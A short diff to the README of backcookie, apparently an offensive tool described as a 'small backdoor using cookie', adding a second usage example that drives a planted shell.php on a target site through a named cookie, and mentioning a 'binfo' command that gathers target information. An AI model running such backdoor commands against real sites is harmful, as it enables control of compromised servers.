@@ -12,7 +12,10 @@ Small backdoor using cookie.
 ```
 
 ```
-Example: python backcookie.py -u http://target.com/shell.php -c name_cookie
+Example one: python backcookie.py -u http://target.com/shell.php -c name_cookie
+```
+```
+Example two: python backcookie.py --url http://target.com/shell.php --cookie name_cookie
 ```
 Custom command (binfo), You get objective information
 ```
